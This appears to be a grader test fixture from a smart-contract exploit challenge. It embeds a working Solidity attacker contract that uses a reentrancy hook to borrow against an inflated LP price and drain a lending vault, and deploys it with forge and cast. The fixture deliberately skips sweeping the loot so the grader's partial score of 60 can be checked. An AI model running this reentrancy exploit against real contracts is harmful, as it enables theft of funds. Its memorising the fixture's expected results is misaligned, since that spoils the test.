#!/usr/bin/env python3
"""Broken fixture: run the real exploit, but leave the loot inside the attacker
contract instead of sweeping it to the player.

Expected: vault_drained passes, attacker_profit fails (the player's own balance
never grows). Score 60.
"""
import json
import subprocess
import sys
from pathlib import Path

ATTACKER_SRC = r"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
interface IPool { function lp() external view returns(address); function add_liquidity(uint256) external payable returns(uint256); function remove_liquidity(uint256) external; function get_virtual_price() external view returns(uint256); }
interface IVault { function depositCollateral(uint256) external; function borrow(uint256) external; function cf() external view returns(uint256); function collateral(address) external view returns(uint256); }
interface IERC { function approve(address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); }
contract Attacker {
    IPool pool; IVault vault; IERC token; IERC lp;
    constructor(address _p,address _v,address _t){ pool=IPool(_p); vault=IVault(_v); token=IERC(_t); lp=IERC(pool.lp()); }
    function attack(uint256 addEth,uint256 addTok,uint256 collat) external payable {
        token.approve(address(pool), type(uint256).max);
        uint256 got = pool.add_liquidity{value:addEth}(addTok);
        lp.approve(address(vault), type(uint256).max);
        vault.depositCollateral(collat);
        pool.remove_liquidity(got - collat);
        // NOTE: loot deliberately NOT swept to the caller
    }
    receive() external payable {
        uint256 col = vault.collateral(address(this));
        if (col == 0) return;
        uint256 limit = col * pool.get_virtual_price() / 1e18 * vault.cf() / 1e18;
        uint256 avail = token.balanceOf(address(vault));
        uint256 grab = limit < avail ? limit : avail;
        if (grab > 0) vault.borrow(grab);
    }
}
"""


def main():
    p = json.loads(Path("params.json").read_text())
    rpc = p["rpc_url"]
    key = Path(p["key_file"]).read_text().strip()
    Path("src/AttackerNS.sol").write_text(ATTACKER_SRC)
    if subprocess.run(["forge", "build"], capture_output=True, text=True).returncode != 0:
        sys.exit("forge build failed")
    code = json.loads(Path("out/AttackerNS.sol/Attacker.json").read_text())["bytecode"]["object"]

    def pad(a):
        return a.lower().replace("0x", "").rjust(64, "0")

    creation = code + pad(p["pool"]) + pad(p["vault"]) + pad(p["token"])
    out = subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key,
                          "--create", creation, "--json"], capture_output=True, text=True)
    atk = json.loads(out.stdout)["contractAddress"]

    add_eth = p["player_eth_wei"]
    add_tok = p["player_tokens_wei"]
    subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, atk,
                    "--value", str(add_eth)], capture_output=True, text=True)
    subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, p["token"],
                    "transfer(address,uint256)", atk, str(add_tok)], capture_output=True, text=True)
    subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, atk,
                    "attack(uint256,uint256,uint256)", str(add_eth), str(add_tok), str(200 * 10**18)],
                   capture_output=True, text=True)
    print("drained but did not sweep")


if __name__ == "__main__":
    main()
